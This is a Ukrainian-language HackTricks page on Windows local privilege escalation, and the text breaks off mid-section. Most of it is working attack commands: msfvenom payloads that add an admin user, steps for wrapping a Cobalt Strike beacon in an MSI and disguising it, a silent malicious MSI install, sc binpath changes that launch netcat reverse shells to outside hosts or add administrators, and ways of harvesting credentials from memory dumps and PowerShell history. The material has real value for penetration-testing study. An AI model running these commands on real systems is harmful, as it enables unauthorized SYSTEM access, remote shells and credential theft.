# Локальне підвищення привілеїв в Windows

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпецівій компанії**? Хочете побачити, як ваша **компанія рекламується на HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**репозиторію hacktricks**](https://github.com/carlospolop/hacktricks) **та** [**репозиторію hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Кращий інструмент для пошуку векторів локального підвищення привілеїв в Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Початкова теорія Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, прочитайте наступну сторінку перед продовженням:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Перевірте наступну сторінку для отримання додаткової інформації про ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності в Windows, вам слід прочитати наступну сторінку перед продовженням:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Контроль за безпекою Windows

Є різні речі в Windows, які можуть **запобігти вам переліку системи**, запуску виконуваних файлів або навіть **виявленню ваших дій**. Вам слід **прочитати** наступну **сторінку** та **перелічити** всі ці **захисні механізми** перед початком переліку підвищення привілеїв:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Інформація про систему

### Перелік інформації про версію

Перевірте, чи є відомі вразливості в версії Windows (також перевірте застосовані патчі).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Версія Використання Уразливостей

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) корисний для пошуку детальної інформації про уразливості безпеки Microsoft. Ця база даних містить понад 4 700 уразливостей безпеки, показуючи **велику поверхню атаки**, яку представляє середовище Windows.

**На системі**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_

**Локально з інформацією про систему**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії Github з експлойтами:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи є які-небудь облікові дані/соковита інформація, збережена в змінних середовища?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Історія PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Файли транскрипції PowerShell

Ви можете дізнатися, як увімкнути це за посиланням [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Логування модуля PowerShell

Деталі виконання конвеєра PowerShell записуються, охоплюючи виконані команди, виклики команд та частини сценаріїв. Однак повні деталі виконання та результати виводу можуть не бути зафіксовані.

Щоб це увімкнути, слідувати інструкціям у розділі "Файли транскрипції" документації, обираючи **"Логування модуля"** замість **"Транскрипція PowerShell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Для перегляду останніх 15 подій з журналів PowersShell ви можете виконати:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Логування блоків сценаріїв**

Записується повний запис активності та вмісту виконання сценарію, що гарантує документування кожного блоку коду під час його виконання. Цей процес зберігає повний аудиторський слід кожної активності, що є цінним для форензики та аналізу зловмисної поведінки. Шляхом документування всієї активності на момент виконання надаються детальні відомості про процес.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Журнали подій для блоку сценаріїв можна знайти в Події Windows за шляхом: **Журнали програм та служб > Microsoft > Windows > PowerShell > Робочі**.\
Для перегляду останніх 20 подій можна використовувати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Інтернету
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Диски
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Ви можете скомпрометувати систему, якщо оновлення не запитуються за допомогою http**S**, а лише http.

Ви починаєте з перевірки, чи мережа використовує оновлення WSUS без SSL, запустивши наступне:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Якщо ви отримуєте відповідь у вигляді:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` дорівнює `1`.

Тоді, **це можна використати.** Якщо останній реєстр дорівнює 0, то запис WSUS буде проігноровано.

Для використання цих вразливостей можна використовувати такі інструменти, як: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Це скрипти збройованого вибуху серед людей посередників для впровадження "фальшивих" оновлень в незахищений трафік WSUS.

Прочитайте дослідження тут:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Прочитайте повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
За сутністю, це недолік, який використовує ця помилка:

> Якщо у нас є можливість змінювати наш локальний проксі, і оновлення Windows використовує проксі, налаштований у налаштуваннях Internet Explorer, ми, отже, маємо можливість запускати [PyWSUS](https://github.com/GoSecure/pywsus) локально для перехоплення власного трафіку та запуску коду як підвищений користувач на нашому активі.
>
> Крім того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо ми генеруємо самопідписаний сертифікат для імені хоста WSUS і додаємо цей сертифікат у сховище сертифікатів поточного користувача, ми зможемо перехоплювати як HTTP, так і HTTPS трафік WSUS. WSUS не використовує механізми подібні до HSTS для впровадження перевірки типу довіри при першому використанні сертифіката. Якщо сертифікат, представлений, довіряється користувачем і має правильне ім'я хоста, його прийме служба.

Ви можете використати цю вразливість за допомогою інструменту [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (після його звільнення).

## KrbRelayUp

Існує **вразливість локального підвищення привілеїв** в середовищах Windows **домену** за певних умов. Ці умови включають середовища, де **підписування LDAP не вимагається,** користувачі мають власні права, що дозволяють їм налаштовувати **обмеження делегування на основі ресурсів (RBCD),** та можливість користувачів створювати комп'ютери в межах домену. Важливо зауважити, що ці **вимоги** виконуються за допомогою **стандартних налаштувань**.

Знайдіть **експлойт** в [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Для отримання додаткової інформації про хід атаки перевірте [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Якщо** ці 2 реєстри **увімкнені** (значення **0x1**), то користувачі будь-якого рівня привілеїв можуть **встановлювати** (виконувати) файли `*.msi` як NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Пейлоади Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку, використовуючи модуль **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використовуйте команду `Write-UserAddMSI` з power-up, щоб створити у поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт записує попередньо скомпільований інсталятор MSI, який запитує про додавання користувача/групи (тому вам знадобиться доступ до GIU):
```
Write-UserAddMSI
```
### Виконайте створений бінарний файл для підвищення привілеїв.

### Обгортка MSI

Прочитайте цей посібник, щоб дізнатися, як створити обгортку MSI за допомогою цих інструментів. Зверніть увагу, що ви можете обгорнути файл "**.bat**", якщо ви просто хочете **виконати** **командні рядки**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Створення MSI за допомогою WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Створення MSI за допомогою Visual Studio

* **Створіть** з Cobalt Strike або Metasploit **новий Windows EXE TCP payload** в `C:\privesc\beacon.exe`
* Відкрийте **Visual Studio**, виберіть **Створити новий проект** та введіть "installer" у поле пошуку. Виберіть проект **Майстер налаштування** та натисніть **Далі**.
* Дайте проекту назву, наприклад **AlwaysPrivesc**, використовуйте **`C:\privesc`** для розташування, виберіть **розмістити рішення та проект в одній теки**, та натисніть **Створити**.
* Продовжуйте натискати **Далі**, поки не дійдете до кроку 3 з 4 (вибір файлів для включення). Натисніть **Додати** та виберіть створений вами файл Beacon payload. Потім натисніть **Готово**.
* Виділіть проект **AlwaysPrivesc** в **Дереві рішень** та в **Властивостях** змініть **TargetPlatform** з **x86** на **x64**.
* Є інші властивості, які можна змінити, такі як **Author** та **Manufacturer**, які можуть зробити встановлену програму більш правдоподібною.
* Клацніть правою кнопкою миші на проекті та виберіть **Вид > Власні дії**.
* Клацніть правою кнопкою миші на **Install** та виберіть **Додати власну дію**.
* Двічі клацніть на **Папка програми**, виберіть ваш файл **beacon.exe** та клацніть **OK**. Це забезпечить виконання пейлоаду beacon, як тільки виконується встановлювач.
* У властивостях **Власної дії** змініть **Run64Bit** на **True**.
* Нарешті, **зіберіть це**.
* Якщо відображається попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу на x64.

### Встановлення MSI

Для виконання **встановлення** зловмисного файлу `.msi` в **фоновому режимі:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Для експлуатації цієї вразливості ви можете використовувати: _exploit/windows/local/always\_install\_elevated_

## Антивірус та детектори

### Налаштування аудиту

Ці налаштування визначають, що **записується у журнал**, тому вам слід звернути увагу
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, цікаво знати, куди відправляються журнали
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначений для **управління паролями локального адміністратора**, забезпечуючи унікальність, випадковість та регулярне оновлення кожного пароля на комп'ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory та можуть бути доступні лише користувачам, які мають достатні дозволи через ACL, що дозволяє їм переглядати локальні адміністраторські паролі у разі авторизації.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Якщо активовано, **паролі у відкритому вигляді зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Додаткова інформація про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Захист LSA

Починаючи з **Windows 8.1**, Microsoft впровадила покращений захист для місцевої служби безпеки (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам'ять** або впроваджувати код, додатково забезпечуючи систему.\
[**Додаткова інформація про захист LSA тут**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Захист віджалювання облікових даних

**Захист облікових даних** був впроваджений в **Windows 10**. Його ціль - захист облікових даних, збережених на пристрої, від загроз, таких як атаки типу pass-the-hash.| [**Додаткова інформація про захист облікових даних тут.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Кешовані облікові дані

**Облікові дані домену** аутентифікуються **Місцевим органом безпеки** (LSA) та використовуються компонентами операційної системи. Коли дані входу користувача аутентифікуються зареєстрованим пакетом безпеки, зазвичай встановлюються облікові дані домену для користувача.\
[**Додаткова інформація про кешовані облікові дані тут**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та Групи

### Перелік Користувачів та Груп

Вам слід перевірити, чи мають які-небудь з груп, до яких ви належите, цікаві дозволи
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до деякої привілейованої групи, ви можете підняти привілеї**. Дізнайтеся про привілейовані групи та як їх використовувати для підвищення привілеїв тут:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Маніпулювання токенами

Дізнайтеся більше про те, що таке **токен** на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Перевірте наступну сторінку, щоб **дізнатися про цікаві токени** та як їх зловживати:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Залоговані користувачі / Сесії
```bash
qwinsta
klist sessions
```
### Домашні теки
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримати вміст буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Дозволи на файли та теки

По-перше, перелік процесів **перевірте наявність паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати деякий виконуваний файл** або чи маєте права на запис у теку виконуваного файлу для використання можливих [**атак DLL Hijacking**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Завжди перевіряйте можливі [**відлагоджувачі electron/cef/chromium**, які працюють, ви можете скористатися цим для підвищення привілеїв](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів виконуваних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів на теки виконуваних файлів процесів (**[**DLL Hijacking**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Видобуток паролів з пам'яті

Ви можете створити дамп пам'яті запущеного процесу, використовуючи **procdump** від sysinternals. Служби, такі як FTP, мають **паролі у відкритому вигляді в пам'яті**, спробуйте витягти дамп пам'яті та прочитати паролі.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI додатки

**Додатки, які працюють як SYSTEM, можуть дозволити користувачеві створити CMD або переглянути каталоги.**

Приклад: "Довідка та підтримка Windows" (Windows + F1), пошук "командний рядок", клацніть "Клацніть, щоб відкрити командний рядок"

## Служби

Отримати список служб:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про сервіс.
```bash
sc qc <service_name>
```
Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи може "Authenticated Users" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Ви можете завантажити accesschk.exe для XP тут](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо у вас виникає ця помилка (наприклад, з SSDPSRV):

_Системна помилка 1058 сталася._\
_Службу не можна запустити через те, що вона вимкнена або у неї немає активованих пристроїв, пов'язаних з нею._

Ви можете увімкнути її, використовуючи
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Врахуйте, що служба upnphost залежить від SSDPSRV для роботи (для XP SP1)**

**Ще один обхідний шлях** цієї проблеми - запуск:
```
sc.exe config usosvc start= auto
```
### **Зміна шляху бінарного файлу служби**

У випадку, коли група "Автентифіковані користувачі" має **SERVICE\_ALL\_ACCESS** до служби, можлива зміна виконуваного бінарного файлу служби. Для зміни та виконання **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапуск служби
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Привілеї можуть бути підвищені за допомогою різних дозволів:

* **SERVICE\_CHANGE\_CONFIG**: Дозволяє переконфігурувати бінарний файл служби.
* **WRITE\_DAC**: Дозволяє переконфігурувати дозволи, що призводить до можливості зміни конфігурації служби.
* **WRITE\_OWNER**: Дозволяє отримати власність та переконфігурувати дозволи.
* **GENERIC\_WRITE**: Наслідує можливість зміни конфігурації служби.
* **GENERIC\_ALL**: Також наслідує можливість зміни конфігурації служби.

Для виявлення та експлуатації цієї уразливості можна використовувати _exploit/windows/local/service\_permissions_.

### Слабкі дозволи на бінарні файли служб

**Перевірте, чи можете ви змінювати бінарний файл, який виконується службою**, або чи маєте **права на запис у папці**, де розташований бінарний файл ([**DLL Hijacking**](dll-hijacking.md))**.**\
Ви можете отримати кожний бінарний файл, який виконується службою, використовуючи **wmic** (не в system32) та перевірити ваші дозволи, використовуючи **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ви також можете використовувати **sc** та **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Дозволи на зміну реєстру служб

Вам слід перевірити, чи можете ви змінювати будь-який реєстр служб.\
Ви можете **перевірити** свої **дозволи** на реєстр служб, виконавши:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Потрібно перевірити, чи **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** мають дозвіл `FullControl`. Якщо так, то можна змінити шлях до виконуваного бінарного файлу.

Для зміни шляху виконуваного бінарного файлу:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Дозволи на додавання даних/створення підкаталогів у реєстрі служб

Якщо у вас є цей дозвіл у реєстрі, це означає, що **ви можете створювати підкаталоги з цього**. У випадку служб Windows цього **достатньо для виконання довільного коду:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Шляхи до служб без кавичок

Якщо шлях до виконуваного файлу не знаходиться в кавичках, Windows спробує виконати кожен кінець перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
### Перелік усіх шляхів служб без кавичок, за винятком тих, що належать вбудованим службам Windows:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити і використати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Відновлювальні дії

Windows дозволяє користувачам вказати дії, які слід виконати у разі невдачі служби. Цю функцію можна налаштувати так, щоб вказувала на бінарний файл. Якщо цей бінарний файл можна замінити, можливий підвищення привілеїв. Докладнішу інформацію можна знайти в [офіційній документації](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Застосунки

### Встановлені застосунки

Перевірте **дозволи на бінарні файли** (можливо, ви зможете їх перезаписати та підвищити привілеї) та **папки** ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Права на запис

Перевірте, чи можете ви змінювати деякий конфігураційний файл для читання деякого спеціального файлу або чи можете змінювати деякий виконуваний файл, який буде виконуватися обліковим записом адміністратора (schedtasks).

Один зі способів знайти слабкі дозволи на теки/файли в системі - це:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Запуск при старті

**Перевірте, чи можете ви перезаписати деякі реєстри або виконуваний файл, який буде запущений іншим користувачем.**\
**Прочитайте** наступну сторінку, щоб дізнатися більше про цікаві **місця автозапуску для підвищення привілеїв**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Драйвери

Шукайте можливі **сторонні дивні/вразливі** драйвери
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## ВИКОРИСТАННЯ DLL У ПРОЦЕСІ PATH

Якщо у вас є **права на запис у папці, яка є в PATH**, ви можете використати DLL для завантаження процесу та **підвищення привілеїв**.

Перевірте дозволи для всіх папок у PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Для отримання додаткової інформації про те, як зловживати цією перевіркою:

